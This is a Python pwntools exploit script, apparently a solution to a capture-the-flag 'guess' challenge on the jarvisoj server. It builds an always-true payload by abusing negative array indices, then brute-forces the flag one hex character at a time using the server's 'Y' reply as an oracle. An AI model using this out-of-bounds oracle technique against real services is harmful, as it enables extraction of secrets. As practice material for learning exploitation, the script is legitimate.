#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import string
import time
from pwn import *

DEBUG = 0

context(arch='amd64', os='linux')
context.log_level = 'debug' # if DEBUG else 'info'

VAR_FLAG_LEN = 44
PREFIX = b'FAKE{' if DEBUG else b'PCTF{'
SUFFIX = b'}'
prefix = base64.b16encode(PREFIX)
suffix = base64.b16encode(SUFFIX)

io = remote('127.0.0.1', 9999) if DEBUG else remote('pwn.jarvisoj.com', 9878)

tmp = list()
# i = 64  # 0x150 - 0x110
i = 64 - len(PREFIX)
while 1:
    idx = -i % 256
    tmp.append(b'0')
    tmp.append(chr(idx))
    i -= 1
    if len(tmp) >= VAR_FLAG_LEN * 2:
        break

payload = prefix + b''.join(tmp) + suffix
assert len(payload) == 100
log.info('always right payload = %s', payload)

io.sendlineafter('guess> ', payload)

ch = io.recv(1)
assert ch == 'Y'


flag = list()
char_found = 1
for i in xrange(VAR_FLAG_LEN):
    assert char_found == 1
    char_found = 0
    for c in string.hexdigits.lower():
        try:
            log.debug('%d, detect [%s]', i, c)
            cv = b'{:02x}'.format(ord(c))
            cv0, cv1 = cv[0], cv[1]
            tmp[i * 2] = cv0
            tmp[i * 2 + 1] = cv1
            payload = prefix + b''.join(tmp) + suffix
            io.sendlineafter('guess> ', payload)
            ch = io.recv(1)
            # raw_input('...')
            if ch == 'Y':
                char_found = 1
                flag.append(c)
                break
            time.sleep(0.1)
        except:
            log.info(flag)
log.debug(flag)
log.success('flag = %s', PREFIX + b''.join(flag) + SUFFIX)
